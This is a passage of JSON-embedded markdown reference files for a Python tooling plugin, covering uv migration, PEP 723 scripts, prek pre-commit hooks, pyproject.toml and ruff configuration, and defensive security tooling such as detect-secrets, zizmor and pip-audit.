present)\n\n## Post-Migration Easy Wins\n\nRun these to modernize code automatically:\n\n```bash\n# Pyupgrade modernization (typing, syntax)\nuv run ruff check --select=UP --fix .\n\n# Unnecessary variable assignments before return\nuv run ruff check --select=RET504 --fix .\n\n# Simplifications (conditionals, comprehensions)\nuv run ruff check --select=SIM --fix .\n\n# Remove commented-out code\nuv run ruff check --select=ERA --fix .\n```\n\n## CI Cleanup\n\n- [ ] Remove scheduled CI triggers (activity without progress is theater)\n- [ ] Update CI to use `uv sync` and `uv run`\n- [ ] Pin GitHub Actions to SHA hashes\n- [ ] Set up security tooling (see [security-setup.md](./security-setup.md))\n\n## Gradual ty Adoption\n\nFor legacy codebases with many type errors, start lenient:\n\n```toml\n[tool.ty.terminal]\nerror-on-warning = true\n\n[tool.ty.environment]\npython-version = \"3.11\"\n\n[tool.ty.rules]\n# Start with these ignored for legacy codebases\npossibly-missing-attribute = \"ignore\"\nunresolved-import = \"ignore\"\ninvalid-argument-type = \"ignore\"\nnot-subscriptable = \"ignore\"\nunresolved-attribute = \"ignore\"\n```\n\nRemove rules as you fix errors. Track progress:\n\n```bash\n# Count remaining issues\nuv run ty check src/ 2>&1 | grep -c \"error\"\n```\n\n## Supply Chain Security\n\n- [ ] Add pip-audit to dependency groups\n- [ ] Configure Dependabot with 7-day cooldown\n- [ ] Pin exact versions in production (`==` not `>=`)\n\nSee [security-setup.md](./security-setup.md) for pip-audit and Dependabot configuration.\n\n## Verification\n\nAfter migration, verify everything works:\n\n```bash\n# Install all dependencies\nuv sync --all-groups\n\n# Run linting\nuv run ruff check .\nuv run ruff format --check .\n\n# Run type checking\nuv run ty check src/\n\n# Run tests\nuv run pytest\n\n# Security audit\nuv run pip-audit\n\n# Build package (if distributable)\nuv build\n```\n",
        "plugins/modern-python/skills/modern-python/references/pep723-scripts.md": "# PEP 723: Inline Script Metadata\n\nPEP 723 allows embedding dependency metadata directly in Python scripts, eliminating the need for separate `requirements.txt` or `pyproject.toml` files for simple scripts.\n\n## When to Use PEP 723\n\n**Use for:**\n- Single-file scripts with external dependencies\n- Quick automation scripts\n- Utility scripts shared between projects\n- Scripts that need to be self-contained\n\n**Don't use for:**\n- Multi-file projects (use `pyproject.toml`)\n- Reusable packages/libraries\n- Projects requiring complex configuration\n\n## Basic Syntax\n\nThe metadata block uses TOML format embedded in a special comment:\n\n```python\n#!/usr/bin/env -S uv run --script\n# /// script\n# requires-python = \">=3.11\"\n# dependencies = [\n#     \"requests\",\n#     \"rich\",\n# ]\n# ///\n\nimport requests\nfrom rich import print\n\nresponse = requests.get(\"https://api.example.com/data\")\nprint(response.json())\n```\n\n## Running Scripts\n\n```bash\n# With uv (recommended)\nuv run script.py\n\n# Script handles its own dependencies automatically\n./script.py  # If shebang is set\n```\n\n## Metadata Fields\n\n### Required Python Version\n\n```python\n# /// script\n# requires-python = \">=3.11\"\n# ///\n```\n\n### Dependencies\n\n```python\n# /// script\n# dependencies = [\n#     \"requests\",\n#     \"click\",\n#     \"rich\",\n# ]\n# ///\n```\n\n### Private Package Index\n\n```python\n# /// script\n# dependencies = [\"httpx\"]\n#\n# [tool.uv]\n# extra-index-url = [\"https://pypi.company.com/simple/\"]\n# ///\n```\n\n## Complete Example\n\n```python\n#!/usr/bin/env -S uv run --script\n# /// script\n# requires-python = \">=3.11\"\n# dependencies = [\n#     \"httpx\",\n#     \"rich\",\n#     \"typer\",\n# ]\n# ///\n\n\"\"\"Fetch and display API data with nice formatting.\"\"\"\n\nimport httpx\nimport typer\nfrom rich.console import Console\nfrom rich.table import Table\n\nconsole = Console()\napp = typer.Typer()\n\n\n@app.command()\ndef fetch(url: str, format: str = \"table\"):\n    \"\"\"Fetch data from URL and display it.\"\"\"\n    with httpx.Client() as client:\n        response = client.get(url)\n        response.raise_for_status()\n        data = response.json()\n\n    if format == \"table\" and isinstance(data, list):\n        table = Table()\n        if data:\n            for key in data[0].keys():\n                table.add_column(key)\n            for item in data:\n                table.add_row(*[str(v) for v in item.values()])\n        console.print(table)\n    else:\n        console.print_json(data=data)\n\n\nif __name__ == \"__main__\":\n    app()\n```\n\n## Creating Scripts with uv\n\n```bash\n# Create new script with metadata\nuv init --script myscript.py\n\n# Add dependency to existing script\nuv add --script myscript.py requests\n\n# Remove dependency from script\nuv remove --script myscript.py requests\n```\n\n## Shebang Options\n\n### Basic (requires uv in PATH)\n\n```python\n#!/usr/bin/env -S uv run --script\n```\n\n### With specific Python version\n\n```python\n#!/usr/bin/env -S uv run --python 3.12 --script\n```\n\n### Quiet mode (suppress uv output)\n\n```python\n#!/usr/bin/env -S uv run --quiet --script\n```\n\n## Examples by Use Case\n\n### Data Processing Script\n\n```python\n#!/usr/bin/env -S uv run --script\n# /// script\n# requires-python = \">=3.11\"\n# dependencies = [\"pandas\", \"openpyxl\"]\n# ///\n\nimport pandas as pd\nimport sys\n\ndf = pd.read_excel(sys.argv[1])\nprint(df.describe())\n```\n\n### Web Scraping Script\n\n```python\n#!/usr/bin/env -S uv run --script\n# /// script\n# requires-python = \">=3.11\"\n# dependencies = [\"httpx\", \"beautifulsoup4\", \"lxml\"]\n# ///\n\nimport httpx\nfrom bs4 import BeautifulSoup\n\nresponse = httpx.get(\"https://example.com\")\nsoup = BeautifulSoup(response.text, \"lxml\")\nprint(soup.title.string)\n```\n\n### CLI Tool Script\n\n```python\n#!/usr/bin/env -S uv run --script\n# /// script\n# requires-python = \">=3.11\"\n# dependencies = [\"typer\", \"rich\"]\n# ///\n\nimport typer\nfrom rich import print\n\napp = typer.Typer()\n\n@app.command()\ndef greet(name: str):\n    print(f\"[green]Hello, {name}![/green]\")\n\nif __name__ == \"__main__\":\n    app()\n```\n\n### Async Script\n\n```python\n#!/usr/bin/env -S uv run --script\n# /// script\n# requires-python = \">=3.11\"\n# dependencies = [\"httpx\"]\n# ///\n\nimport asyncio\nimport httpx\n\nasync def main():\n    async with httpx.AsyncClient() as client:\n        urls = [\"https://api1.example.com\", \"https://api2.example.com\"]\n        tasks = [client.get(url) for url in urls]\n        responses = await asyncio.gather(*tasks)\n        for r in responses:\n            print(r.status_code)\n\nasyncio.run(main())\n```\n\n## Best Practices\n\n1. **Always specify `requires-python`** - Ensures compatibility\n2. **Pin major versions for Python** - Use `>=3.11` not `==3.11`\n3. **Omit version constraints for dependencies** - Use `uv add --script` to add dependencies; let uv select versions\n4. **Keep scripts focused** - One script, one purpose\n5. **Add docstring** - Document what the script does\n6. **Use type hints** - Improves readability and catches errors\n\n## Limitations\n\n- No support for dependency groups\n- No support for editable installs\n- No support for local dependencies (use relative imports)\n- No lockfile (versions may vary between runs)\n\nFor projects needing these features, use a full `pyproject.toml` setup instead.\n",
        "plugins/modern-python/skills/modern-python/references/prek.md": "# prek: Fast Pre-commit Hooks\n\n[prek](https://github.com/j178/prek) is a fast, Rust-native drop-in replacement for pre-commit. It uses the same `.pre-commit-config.yaml` format and is fully compatible with existing configurations.\n\n## Why prek over pre-commit?\n\n| Feature | prek | pre-commit |\n|---------|------|------------|\n| Speed | ~7x faster hook installation | Slower |\n| Dependencies | Single binary, no runtime needed | Requires Python |\n| Disk usage | Shared toolchains between hooks | Isolated environments |\n| Parallelism | Parallel repo cloning and hook execution | Sequential |\n| Python management | Uses uv automatically | Manual Python setup |\n| Monorepo support | Built-in workspace mode | Not supported |\n\n**Already using prek:** CPython, Apache Airflow, FastAPI, Ruff, Home Assistant, and [many more](https://github.com/j178/prek#who-is-using-prek).\n\n## Installation\n\nSee [security-setup.md](./security-setup.md#tool-installation) for installation options.\n\n## Quick Start\n\n### For Existing pre-commit Users\n\nprek is fully compatible with `.pre-commit-config.yaml`. Just replace commands:\n\n```bash\n# Instead of: pre-commit install\nprek install\n\n# Instead of: pre-commit run --all-files\nprek run --all-files\n\n# Instead of: pre-commit autoupdate\nprek auto-update\n```\n\n### New Setup\n\n1. Create `.pre-commit-config.yaml`:\n\n```yaml\nrepos:\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: <latest>  # https://github.com/astral-sh/ruff-pre-commit/releases\n    hooks:\n      - id: ruff\n        args: [--fix]\n      - id: ruff-format\n```\n\n2. Install and run:\n\n```bash\n# Install git hooks\nprek install\n\n# Run manually on all files\nprek run --all-files\n\n# Run specific hook\nprek run ruff\n```\n\n## Configuration\n\nFor a complete, copy-paste-ready configuration, see [templates/pre-commit-config.yaml](../templates/pre-commit-config.yaml).\n\n### Recommended `.pre-commit-config.yaml`\n\n> **Note:** Versions shown as `<latest>` are placeholders. Always check the linked releases for current stable versions before use.\n\n```yaml\n# See https://pre-commit.com for more information\ndefault_language_version:\n  python: python3.12\n\nrepos:\n  # Ruff - linting and formatting\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: <latest>  # https://github.com/astral-sh/ruff-pre-commit/releases\n    hooks:\n      - id: ruff\n        args: [--fix]\n      - id: ruff-format\n\n  # General file checks (prek builtin - faster, no external deps)\n  - repo: builtin\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-merge-conflict\n\n  # Security hooks - see security-setup.md for detailed guidance\n  # Shell script linting\n  - repo: https://github.com/koalaman/shellcheck-precommit\n    rev: <latest>  # https://github.com/koalaman/shellcheck-precommit/tags\n    hooks:\n      - id: shellcheck\n        args: [--severity=error]\n\n  # Secret detection\n  - repo: https://github.com/Yelp/detect-secrets\n    rev: <latest>  # https://github.com/Yelp/detect-secrets/releases\n    hooks:\n      - id: detect-secrets\n        args: [--baseline, .secrets.baseline]\n\n  # GitHub Actions linting\n  - repo: https://github.com/rhysd/actionlint\n    rev: <latest>  # https://github.com/rhysd/actionlint/releases\n    hooks:\n      - id: actionlint\n\n  # GitHub Actions security audit\n  - repo: https://github.com/zizmorcore/zizmor-pre-commit\n    rev: <latest>  # https://github.com/zizmorcore/zizmor-pre-commit/releases\n    hooks:\n      - id: zizmor\n        args: [--persona=regular, --min-severity=medium, --min-confidence=medium]\n```\n\nSee [security-setup.md](./security-setup.md) for detailed guidance on each security hook.\n\n### Using Built-in Hooks\n\nprek includes Rust-native implementations of common hooks for extra speed:\n\n```yaml\nrepos:\n  - repo: builtin\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-json\n      - id: check-toml\n```\n\n## Commands\n\n| Command | Description |\n|---------|-------------|\n| `prek install` | Install git hooks |\n| `prek uninstall` | Remove git hooks |\n| `prek run` | Run hooks on staged files |\n| `prek run --all-files` | Run on all files |\n| `prek run --last-commit` | Run on last commit's files |\n| `prek run HOOK [HOOK...]` | Run specific hook(s) |\n| `prek run -d src/` | Run on files in directory |\n| `prek auto-update` | Update hook versions |\n| `prek list` | List configured hooks |\n| `prek clean` | Remove cached environments |\n\n## CI Configuration\n\n### GitHub Actions\n\n```yaml\nname: Pre-commit\non: [push, pull_request]\n\njobs:\n  prek:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@<sha>  # <latest> https://github.com/actions/checkout/releases\n      - uses: j178/prek-action@<sha>  # <latest> https://github.com/j178/prek-action/releases\n```\n\nOr manually:\n\n```yaml\n- name: Install prek\n  run: uv tool install prek\n\n- name: Run hooks\n  run: prek run --all-files\n```\n\n## Makefile Integration\n\n```makefile\n.PHONY: hooks hooks-install\n\nhooks:\n\tprek run --all-files\n\nhooks-install:\n\tprek install\n```\n\n## Migration from pre-commit\n\n1. Install prek: `uv tool install prek`\n2. Remove pre-commit: `pip uninstall pre-commit` or `uv tool uninstall pre-commit`\n3. Re-install hooks: `prek install`\n4. (Optional) Clean old environments: `rm -rf ~/.cache/pre-commit`\n\nYour existing `.pre-commit-config.yaml` works unchanged.\n\n## Best Practices\n\n1. **Use `prek run --all-files` in CI** - Ensures all files are checked, not just changed ones\n2. **Pin hook versions** - Use specific `rev` values, not branches\n3. **Use `--cooldown-days` for auto-update** - Mitigates supply chain attacks: `prek auto-update --cooldown-days 7`\n4. **Prefer built-in hooks** - Use `repo: builtin` for common checks (faster, offline)\n5. **Run hooks before commit** - `prek install` sets this up automatically\n6. **Initialize detect-secrets baseline** - Run `detect-secrets scan > .secrets.baseline` before first commit\n",
        "plugins/modern-python/skills/modern-python/references/pyproject.md": "# pyproject.toml Configuration Reference\n\nComplete reference for configuring `pyproject.toml` for modern Python projects.\n\n**Important**: Always use `uv add` and `uv remove` to manage dependencies. Do not edit the `dependencies` or `dependency-groups` sections directly.\n\n## Complete Example\n\n```toml\n[project]\nname = \"myproject\"\nversion = \"0.1.0\"\ndescription = \"A modern Python project\"\nreadme = \"README.md\"\nlicense = \"MIT\"\nrequires-python = \">=3.11\"\nauthors = [\n    { name = \"Your Name\", email = \"you@example.com\" }\n]\nclassifiers = [\n    \"Development Status :: 4 - Beta\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 3.11\",\n    \"Programming Language :: Python :: 3.12\",\n    \"Programming Language :: Python :: 3.13\",\n]\ndependencies = [\n    \"requests\",\n    \"rich\",\n]\n\n[project.optional-dependencies]\n# Use for optional features users can install\ncli = [\"typer\"]\n\n[project.scripts]\nmyproject = \"myproject.cli:main\"\n\n[project.urls]\nHomepage = \"https://github.com/org/myproject\"\nDocumentation = \"https://myproject.readthedocs.io\"\nRepository = \"https://github.com/org/myproject\"\n\n[build-system]\nrequires = [\"uv_build>=0.9,<1\"]  # Use latest 0.x; check https://pypi.org/project/uv-build/\nbuild-backend = \"uv_build\"\n\n[dependency-groups]\ndev = [\"ruff\", \"ty\"]\ntest = [\"pytest\", \"pytest-cov\", \"hypothesis\"]\ndocs = [\"sphinx\", \"myst-parser\"]\n\n[tool.uv]\ndefault-groups = [\"dev\", \"test\"]\n\n[tool.ruff]\nline-length = 100\ntarget-version = \"py311\"\nsrc = [\"src\"]\n\n[tool.ruff.lint]\nselect = [\"ALL\"]\nignore = [\n    \"D\",        # pydocstyle (enable selectively)\n    \"COM812\",   # trailing comma (conflicts with formatter)\n    \"ISC001\",   # implicit string concat (conflicts with formatter)\n]\n\n[tool.ruff.lint.per-file-ignores]\n\"tests/**/*.py\" = [\n    \"S101\",     # assert allowed in tests\n    \"PLR2004\",  # magic values allowed in tests\n    \"ANN\",      # annotations optional in tests\n]\n\n[tool.ruff.format]\nquote-style = \"double\"\nindent-style = \"space\"\ndocstring-code-format = true\n\n[tool.pytest]\ntestpaths = [\"tests\"]\npythonpath = [\"src\"]\naddopts = [\n    \"--cov=myproject\",\n    \"--cov-report=term-missing\",\n    \"--cov-fail-under=80\",\n]\n\n[tool.coverage.run]\nbranch = true\nsource = [\"src/myproject\"]\n\n[tool.coverage.report]\nexclude_lines = [\n    \"pragma: no cover\",\n    \"if TYPE_CHECKING:\",\n    \"if __name__ == .__main__.:\",\n]\n```\n\n## Section Reference\n\n### [project]\n\nCore project metadata following PEP 621.\n\n| Field | Required | Description |\n|-------|----------|-------------|\n| `name` | Yes | Package name (lowercase, hyphens) |\n| `version` | Yes | Semantic version |\n| `description` | No | One-line description |\n| `readme` | No | Path to README file |\n| `license` | No | SPDX license identifier |\n| `requires-python` | Recommended | Python version constraint |\n| `authors` | No | List of author dicts |\n| `dependencies` | No | Runtime dependencies |\n\n### [project.optional-dependencies]\n\n**Rarely needed.** Only use for optional *runtime* features that end users install:\n\n```toml\n[project.optional-dependencies]\n# User installs with: uv add myproject[postgres]\npostgres = [\"psycopg2\"]\n```\n\n**Do NOT use for dev tools**use `[dependency-groups]` instead.\n\n### [project.scripts]\n\nConsole entry points:\n\n```toml\n[project.scripts]\nmyproject = \"myproject.cli:main\"\nmyproject-serve = \"myproject.server:run\"\n```\n\n### [build-system]\n\nBuild backend configuration. Use `uv_build` for most projects:\n\n```toml\n[build-system]\nrequires = [\"uv_build>=0.9,<1\"]  # Use latest 0.x; check https://pypi.org/project/uv-build/\nbuild-backend = \"uv_build\"\n```\n\n`uv_build` is simpler and sufficient for most use cases. Use static versioning in `[project] version` rather than VCS-aware dynamic versioning.\n\nFor flat layout (no `src/` directory), configure the module root:\n\n```toml\n[tool.uv.build-backend]\nmodule-root = \"\"\n```\n\n> **Note:** These tools evolve rapidly. Prefer `>=X.Y,<X+1` constraints to automatically get newer releases within the same major version.\n\n### [dependency-groups]\n\nDevelopment dependencies (PEP 735). Unlike optional-dependencies, these are NOT installed by users:\n\n```toml\n[dependency-groups]\ndev = [{include-group = \"lint\"}, {include-group = \"test\"}, {include-group = \"audit\"}]\nlint = [\"ruff\", \"ty\"]\ntest = [\"pytest\", \"pytest-cov\"]\naudit = [\"pip-audit\"]\ndocs = [\"sphinx\", \"myst-parser\"]\n```\n\nInstall with: `uv sync --group dev --group test`\n\n### [tool.uv]\n\nuv-specific configuration:\n\n```toml\n[tool.uv]\n# Default groups to install with `uv sync`\ndefault-groups = [\"dev\", \"test\"]\n\n# Python version management\npython-preference = \"managed\"\n```\n\n## Version Specifiers\n\n| Specifier | Meaning |\n|-----------|---------|\n| `>=1.0` | At least version 1.0 |\n| `>=1.0,<2.0` | Version 1.x only |\n| `~=1.4` | Compatible release (>=1.4, <2.0) |\n| `==1.4.*` | Any 1.4.x version |\n\n## uv.lock Handling\n\n| Project Type | uv.lock in Git? | Why |\n|--------------|-----------------|-----|\n| Application |  Commit | Reproducible deploys |\n| Library |  .gitignore | Users resolve their own deps |\n\n## Common Patterns\n\n### Library Package\n\n```toml\n[project]\ndependencies = []  # Minimal runtime deps\n\n[project.optional-dependencies]\n# Optional runtime features (user installs with mylib[async])\nasync = [\"httpx\"]\n\n[dependency-groups]\ndev = [\"ruff\", \"ty\"]\ntest = [\"pytest\", \"pytest-cov\"]\n```\n\n### Application Package\n\n```toml\n[project]\ndependencies = [\n    \"fastapi\",\n    \"uvicorn\",\n    \"sqlalchemy\",\n]\n\n[project.scripts]\nmyapp = \"myapp.main:run\"\n\n[dependency-groups]\ndev = [\"ruff\", \"ty\", \"pytest\"]\n```\n\n### CLI Tool\n\n```toml\n[project]\ndependencies = [\n    \"typer\",\n    \"rich\",\n]\n\n[project.scripts]\nmytool = \"mytool.cli:app\"\n\n[dependency-groups]\ndev = [\"ruff\", \"ty\", \"pytest\"]\n```\n",
        "plugins/modern-python/skills/modern-python/references/ruff-config.md": "# Ruff Configuration Reference\n\nRuff is an extremely fast Python linter and formatter written in Rust. It replaces flake8, black, isort, pyupgrade, pydocstyle, and many other tools.\n\n## Basic Setup\n\nAdd to `pyproject.toml`:\n\n```toml\n[tool.ruff]\nline-length = 100\ntarget-version = \"py311\"\nsrc = [\"src\"]\n\n[tool.ruff.lint]\nselect = [\"ALL\"]\nignore = [\n    \"D\",        # pydocstyle\n    \"COM812\",   # trailing comma (formatter conflict)\n    \"ISC001\",   # string concat (formatter conflict)\n]\n\n[tool.ruff.format]\nquote-style = \"double\"\nindent-style = \"space\"\ndocstring-code-format = true\n```\n\n## Running Ruff\n\n```bash\n# Lint\nuv run ruff check .\nuv run ruff check --fix .        # Auto-fix\nuv run ruff check --fix --unsafe-fixes .  # Including unsafe fixes\n\n# Format\nuv run ruff format .\nuv run ruff format --check .     # Check only\nuv run ruff format --diff .      # Show diff\n```\n\n## Rule Categories\n\nUsing `select = [\"ALL\"]` enables all rules. Common categories:\n\n| Code | Category | Description |\n|------|----------|-------------|\n| `E`, `W` | pycodestyle | Style errors and warnings |\n| `F` | Pyflakes | Logical errors |\n| `I` | isort | Import sorting |\n| `N` | pep8-naming | Naming conventions |\n| `D` | pydocstyle | Docstring conventions |\n| `UP` | pyupgrade | Python upgrade suggestions |\n| `B` | flake8-bugbear | Bug detection |\n| `S` | flake8-bandit | Security issues |\n| `A` | flake8-builtins | Built-in shadowing |\n| `C4` | flake8-comprehensions | Comprehension improvements |\n| `DTZ` | flake8-datetimez | Timezone-aware datetime |\n| `T10` | flake8-debugger | Debugger statements |\n| `T20` | flake8-print | Print statements |\n| `PT` | flake8-pytest-style | Pytest style |\n| `Q` | flake8-quotes | Quote consistency |\n| `SIM` | flake8-simplify | Simplification suggestions |\n| `TID` | flake8-tidy-imports | Import hygiene |\n| `ARG` | flake8-unused-arguments | Unused arguments |\n| `ERA` | eradicate | Commented-out code |\n| `PL` | Pylint | Pylint rules |\n| `RUF` | Ruff-specific | Ruff's own rules |\n| `ANN` | flake8-annotations | Type annotation checks |\n\n## Recommended Ignores\n\n### Always Ignore (Formatter Conflicts)\n\n```toml\nignore = [\n    \"COM812\",   # missing-trailing-comma\n    \"ISC001\",   # single-line-implicit-string-concatenation\n]\n```\n\n### Common Ignores\n\n```toml\nignore = [\n    \"D\",        # Docstrings (enable selectively)\n    \"ANN401\",   # Dynamically typed Any\n    \"TD002\",    # Missing TODO author\n    \"TD003\",    # Missing TODO link\n    \"FIX002\",   # Line contains TODO\n]\n```\n\n## Per-File Ignores\n\n```toml\n[tool.ruff.lint.per-file-ignores]\n# Tests\n\"tests/**/*.py\" = [\n    \"S101\",     # assert usage\n    \"PLR2004\",  # magic values\n    \"ANN\",      # type annotations\n    \"D\",        # docstrings\n]\n\n# Scripts\n\"scripts/**/*.py\" = [\n    \"T20\",      # print statements\n    \"INP001\",   # implicit namespace package\n]\n\n# __init__.py\n\"__init__.py\" = [\n    \"F401\",     # unused imports (re-exports)\n]\n\n# Migrations\n\"**/migrations/*.py\" = [\n    \"ALL\",      # ignore all\n]\n```\n\n## Import Sorting (isort)\n\n```toml\n[tool.ruff.lint.isort]\nforce-single-line = false\nknown-first-party = [\"myproject\"]\nrequired-imports = [\"from __future__ import annotations\"]\nsection-order = [\n    \"future\",\n    \"standard-library\",\n    \"third-party\",\n    \"first-party\",\n    \"local-folder\",\n]\n```\n\n## Docstring Style (pydocstyle)\n\nIf enabling docstring checks:\n\n```toml\n[tool.ruff.lint]\nselect = [\"D\"]\nignore = [\n    \"D100\",     # Missing module docstring\n    \"D104\",     # Missing public package docstring\n    \"D203\",     # 1 blank line before class docstring (conflicts D211)\n    \"D213\",     # Multi-line summary second line (conflicts D212)\n]\n\n[tool.ruff.lint.pydocstyle]\nconvention = \"google\"  # or \"numpy\", \"pep257\"\n```\n\n## Formatter Configuration\n\n```toml\n[tool.ruff.format]\nquote-style = \"double\"           # or \"single\"\nindent-style = \"space\"           # or \"tab\"\nskip-magic-trailing-comma = false\nline-ending = \"auto\"             # or \"lf\", \"crlf\"\ndocstring-code-format = true\ndocstring-code-line-length = 80\n```\n\n## Type Checking\n\nRuff does NOT do type checking. Use **ty** (from Astral, the same team behind ruff and uv):\n\n```bash\n# Add ty to dev dependencies\nuv add --group dev ty\n\n# Run type checking\nuv run ty check src/\n```\n\nty is significantly faster than mypy or pyright and integrates well with the modern Python toolchain.\n\n## CI Configuration\n\n```yaml\n# GitHub Actions\n- name: Lint\n  run: uv run ruff check --output-format=github .\n\n- name: Format check\n  run: uv run ruff format --check .\n```\n\n## Migration from Other Tools\n\n### From flake8\n\nRuff covers most flake8 plugins. Remove:\n- flake8\n- flake8-* plugins\n- .flake8 config file\n\n### From black\n\nRemove black and use `ruff format`. Remove:\n- black\n- [tool.black] config\n\n### From isort\n\nRuff includes isort. Remove:\n- isort\n- [tool.isort] config\n\nUse `[tool.ruff.lint.isort]` for isort settings.\n\n## Code Modernization\n\nRun pyupgrade rules to modernize syntax to your target Python version:\n\n```bash\nuv run ruff check --select=UP --fix .  # Auto-fix upgrades\nuv run ruff check --select=UP .        # Preview only\n```\n\nCommon modernizations include:\n- `typing.Optional[X]`  `X | None`\n- `typing.List[X]`  `list[X]`\n- `super(ClassName, self)`  `super()`\n- Format strings and other syntax upgrades\n\n## Line Length Migration\n\nIf migrating from 120 to 100 char lines, expect manual fixes.\nFor less churn during initial migration, keep existing:\n\n```toml\nline-length = 120  # Match existing; tighten later\n```\n",
        "plugins/modern-python/skills/modern-python/references/security-setup.md": "# Security Setup\n\nSecurity tooling for Python projects: pre-commit hooks, CI auditing, and dependency scanning.\n\n## Tool Installation\n\nInstall these tools before running the quick setup commands below.\n\n### prek (pre-commit runner)\n\n```bash\n# Homebrew (recommended)\nbrew install prek\n\n# Cargo\ncargo install prek\n\n# Standalone installer\ncurl --proto '=https' --tlsv1.2 -LsSf https://github.com/j178/prek/releases/latest/download/prek-installer.sh | sh\n```\n\n### Security tools\n\nPre-commit hooks auto-install tools when run via prek. For manual CLI usage:\n\n```bash\n# Homebrew (macOS/Linux)\nbrew install actionlint shellcheck\n\n# Python tools via uv\nuv tool install detect-secrets\nuv tool install zizmor\n```\n\nAlternative installation methods:\n\n- **actionlint**: `go install github.com/rhysd/actionlint/cmd/actionlint@latest`\n- **zizmor**: `cargo install zizmor`\n- **detect-secrets**: `pipx install detect-secrets`\n\n## Quick Setup\n\n```bash\n# 1. Install security hooks\nprek install\n\n# 2. Initialize secrets baseline\ndetect-secrets scan > .secrets.baseline\n\n# 3. Audit existing workflows\nactionlint .github/workflows/\nzizmor .github/workflows/\n```\n\nSee [templates/pre-commit-config.yaml](../templates/pre-commit-config.yaml) for a complete hook configuration.\n\n## Tool Matrix\n\n| Tool | Runs | Catches |\n|------|------|---------|\n| **shellcheck** | pre-commit | Shell script bugs, quoting issues |\n| **detect-secrets** | pre-commit | Leaked API keys, passwords, tokens |\n| **actionlint** | pre-commit, CI | Workflow syntax errors, invalid refs |\n| **zizmor** | pre-commit, CI | Workflow security issues, excessive permissions |\n| **pip-audit** | CI, manual | Known CVEs in dependencies |\n| **Dependabot** | scheduled | Outdated dependencies with vulnerabilities |\n\n## Pre-commit Hooks\n\nThese run locally before each commit via prek.\n\n### shellcheck - Shell Script Linting\n\nCatches common shell scripting errors: unquoted variables, undefined variables, deprecated syntax.\n\n```yaml\n# In .pre-commit-config.yaml\n- repo: https://github.com/koalaman/shellcheck-precommit\n  rev: <latest>  # https://github.com/koalaman/shellcheck-precommit/tags\n  hooks:\n    - id: shellcheck\n      args: [--severity=error]  # Start strict, adjust if needed\n```\n\nCommon findings:\n- `SC2086`: Unquoted variable expansion (word splitting risk)\n- `SC2046`: Unquoted command substitution\n- `SC2155`: Declare and assign separately to avoid masking return values\n\n### detect-secrets - Secret Detection\n\nPrevents accidentally committing API keys, passwords, and tokens.\n\n```yaml\n- repo: https://github.com/Yelp/detect-secrets\n  rev: <latest>  # https://github.com/Yelp/detect-secrets/releases\n  hooks:\n    - id: detect-secrets\n      args: [--baseline, .secrets.baseline]\n```\n\n**First-time setup:**\n\n```bash\n# Generate baseline of existing \"secrets\" (false positives to ignore)\ndetect-secrets scan > .secrets.baseline\n\n# Review the baseline - ensure no real secrets\ncat .secrets.baseline\n\n# Commit the baseline\ngit add .secrets.baseline\n```\n\n**When hook fails:**\n\n```bash\n# View the finding (non-interactive)\ndetect-secrets audit --report .secrets.baseline\n```\n\nIf false positive: update baseline with `detect-secrets scan --update .secrets.baseline`\nIf real secret: remove from code and rotate the credential.\n\n## CI Security\n\nThese run in GitHub Actions on every push/PR.\n\n### actionlint - Workflow Syntax Validation\n\nCatches syntax errors, invalid action references, and type mismatches before they fail in CI.\n\n```yaml\n- repo: https://github.com/rhysd/actionlint\n  rev: <latest>  # https://github.com/rhysd/actionlint/releases\n  hooks:\n    - id: actionlint\n```\n\nRun manually:\n\n```bash\nactionlint .github/workflows/\n```\n\nCommon findings:\n- Invalid event triggers\n- Undefined workflow inputs\n- Shell syntax errors in `run:` blocks\n- Invalid action version references\n\n### zizmor - Workflow Security Audit\n\nFinds security issues in GitHub Actions workflows: excessive permissions, injection risks, untrusted inputs.\n\n```yaml\n- repo: https://github.com/zizmorcore/zizmor-pre-commit\n  rev: <latest>  # https://github.com/zizmorcore/zizmor-pre-commit/releases\n  hooks:\n    - id: zizmor\n      args: [--persona=regular, --min-severity=medium, --min-confidence=medium]\n```\n\nRun manually:\n\n```bash\nzizmor .github/workflows/\n```\n\n**Fixing `excessive-permissions`:**\n\nBy default, workflows get `write` access to everything. Lock down with explicit permissions:\n\n```yaml\n# Read-only workflows (lint, test, audit)\npermissions:\n  contents: read\n\n# Workflows that push or create releases\npermissions:\n  contents: write\n\n# Workflows that comment on PRs\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nCommon findings:\n- `excessive-permissions`: No `permissions:` block\n- `template-injection`: Using `${{ github.event.* }}` unsafely\n- `unpinned-action`: Actions not pinned to SHA\n- `dangerous-triggers`: `pull_request_target` with checkout\n\n## Dependency Security\n\n### pip-audit - Vulnerability Scanning\n\nChecks installed packages against the Python Advisory Database (PyPA) for known CVEs.\n\n**Setup:**\n\n```toml\n# pyproject.toml\n[dependency-groups]\naudit = [\"pip-audit\"]\n```\n\n**Usage:**\n\n```bash\n# Audit current environment\nuv run pip-audit\n\n# Audit without installing (faster for CI)\nuv run pip-audit .\n\n# Fix automatically (upgrades vulnerable packages)\nuv run pip-audit --fix\n```\n\n**In CI:**\n\n```yaml\n- name: Security audit\n  run: uv run pip-audit .\n```\n\n**When vulnerabilities found:**\n\n1. Check if the CVE affects your usage (many are in unused code paths)\n2. Update the package: `uv add <package>@latest`\n3. If no fix available: evaluate risk, consider alternatives, or add to ignore list\n\n### Dependabot - Automated Updates\n\nAutomatically creates PRs for outdated dependencies.\n\nCopy [templates/dependabot.yml](../templates/dependabot.yml) to `.github/dependabot.yml`.\n\n**How pip-audit and Dependabot work together:**\n\n| Tool | Trigger | Scope |\n|------|---------|-------|\n| pip-audit | Every CI run | Known CVEs in current deps |\n| Dependabot | Weekly schedule | All outdated deps, security + non-security |\n\n- **pip-audit** catches: \"You have a vulnerable version right now\"\n- **Dependabot** prevents: \"You'll fall behind and accumulate vulnerabilities\"\n\nThe 7-day cooldown protects against attackers publishing malicious updates and hoping for quick adoption before detection.\n\nSee [dependabot.md](./dependabot.md) for advanced configuration.\n\nSee [prek.md](./prek.md) for complete pre-commit hook configuration including security hooks.\n",
